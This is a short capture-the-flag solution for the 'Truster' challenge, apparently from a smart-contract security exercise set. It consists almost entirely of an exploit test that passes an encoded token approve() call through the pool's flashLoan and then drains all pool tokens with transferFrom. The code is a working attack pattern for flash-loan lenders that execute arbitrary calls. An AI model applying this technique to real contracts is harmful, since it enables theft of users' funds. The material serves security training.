# 3 - Truster

### Scripted Solution

```javascript
it('Exploit', async function () {
  // Call `flashLoan` with a `data` payload that approves attacker
  await this.pool.flashLoan(
    // uint256 borrowAmount
    0,
    // address borrower
    attacker.address,
    // address target
    this.token.address,
    // bytes calldata data
    this.token.interface.encodeFunctionData('approve', [
      attacker.address,
      TOKENS_IN_POOL
    ])
  )

  // Call `transferFrom` to withdraw all tokens to attacker
  await this.token
    .connect(attacker)
    .transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)
})
```
